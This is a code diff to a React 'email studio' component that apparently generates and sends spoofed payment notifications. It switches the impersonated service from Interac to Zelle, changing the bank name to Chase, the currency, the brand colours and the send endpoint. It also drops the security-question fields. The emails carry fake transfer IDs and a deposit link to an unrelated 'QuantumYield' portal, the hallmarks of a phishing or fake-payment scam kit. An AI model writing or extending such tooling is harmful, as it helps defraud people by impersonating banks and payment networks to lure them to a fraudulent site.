@@ -14,7 +14,6 @@ import {
   Search,
   Send,
   Eye,
-  EyeOff,
   X,
   CheckCircle2,
   Loader2,
@@ -175,10 +174,7 @@ function EmailStudioContent() {
     recipientName: "John Doe",
     amount: "1,500.00",
     message: "",
-    securityQuestion: "What is the verification code?",
-    securityAnswer: "SECURE123",
   })
-  const [showSecurityAnswer, setShowSecurityAnswer] = useState(false)
 
   // Stable preview transfer ID — only regenerate when template changes
   const [previewTransferId] = useState(`ZELLE-${Math.floor(100000 + Math.random() * 900000)}-PREVIEW`)
@@ -202,16 +198,14 @@ function EmailStudioContent() {
         recipientName: formData.recipientName,
         amount: parseFloat(formData.amount.replace(/,/g, "")) || 0,
         message: formData.message || undefined,
-        securityQuestion: formData.securityQuestion || undefined,
-        securityAnswer: formData.securityAnswer || undefined,
         depositLink: "https://app.quantumyield.digital/deposit-portal",
         transferId: previewTransferId,
         senderName: "QuantumYield Treasury",
         institution: "QuantumYield | Treasury & Vault Portal",
-        bankName: "TD Canada Trust",
+        bankName: "Chase Bank",
         limit: "10,000",
         deviceInfo: "Chrome on Windows",
-        location: "Toronto, Canada",
+        location: "New York, NY",
       })
     : ""
 
@@ -226,7 +220,7 @@ function EmailStudioContent() {
     setSending(true)
 
     try {
-      const response = await fetch("/api/send-interac", {
+      const response = await fetch("/api/send-zelle", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -234,8 +228,6 @@ function EmailStudioContent() {
           recipientName:    formData.recipientName,
           amount:           formData.amount.replace(/,/g, ""),
           message:          formData.message,
-          securityQuestion: formData.securityQuestion,
-          securityAnswer:   formData.securityAnswer,
           templateId:       selectedTemplate || "transfer-received",
           language,
         }),
@@ -529,7 +521,7 @@ function EmailStudioContent() {
                         />
                       </div>
                       <div>
-                        <label className="text-xs font-medium text-zinc-400 mb-1 block">Amount (CAD)</label>
+                        <label className="text-xs font-medium text-zinc-400 mb-1 block">Amount (USD)</label>
                         <Input
                           value={formData.amount}
                           onChange={(e) => setFormData({ ...formData, amount: e.target.value })}
@@ -547,40 +539,14 @@ function EmailStudioContent() {
                         className="bg-zinc-900/50 border-zinc-700 text-white placeholder:text-zinc-600 text-base"
                       />
                     </div>
-                    <div>
-                      <label className="text-xs font-medium text-zinc-400 mb-1 block">Security Question</label>
-                      <Input
-                        value={formData.securityQuestion}
-                        onChange={(e) => setFormData({ ...formData, securityQuestion: e.target.value })}
-                        className="bg-zinc-900/50 border-zinc-700 text-white text-base"
-                      />
-                    </div>
-                    <div>
-                      <label className="text-xs font-medium text-zinc-400 mb-1 block">Security Answer</label>
-                      <div className="relative">
-                        <Input
-                          type={showSecurityAnswer ? "text" : "password"}
-                          value={formData.securityAnswer}
-                          onChange={(e) => setFormData({ ...formData, securityAnswer: e.target.value })}
-                          className="bg-zinc-900/50 border-zinc-700 text-white pr-10 text-base"
-                        />
-                        <button
-                          type="button"
-                          onClick={() => setShowSecurityAnswer((v) => !v)}
-                          className="absolute right-3 top-1/2 -translate-y-1/2 text-zinc-500 hover:text-zinc-300 transition-colors"
-                          tabIndex={-1}
-                        >
-                          {showSecurityAnswer ? <Eye className="w-4 h-4" /> : <EyeOff className="w-4 h-4" />}
-                        </button>
-                      </div>
-                    </div>
+
                   </div>
 
                   <div className="mt-4 flex gap-2">
                     <Button
                       onClick={handleSendEmail}
                       disabled={sending}
-                      className="flex-1 bg-[#FDB913] hover:bg-[#e5a811] text-black font-semibold h-12 text-base"
+                      className="flex-1 bg-[#6D1ED4] hover:bg-[#5A18B0] text-white font-semibold h-12 text-base"
                     >
                       {sending ? (
                         <><Loader2 className="w-4 h-4 mr-2 animate-spin" />Sending...</>
@@ -610,7 +576,7 @@ function EmailStudioContent() {
                 <Card className="bg-zinc-800/50 border-zinc-700 p-4">
                   <div className="flex items-center justify-between mb-3">
                     <h4 className="text-sm font-semibold text-white flex items-center gap-2">
-                      <Eye className="w-4 h-4 text-[#FDB913]" />
+                      <Eye className="w-4 h-4 text-[#6D1ED4]" />
                       Live Preview
                     </h4>
                     <span className="text-xs text-zinc-500 font-medium">{language.toUpperCase()}</span>
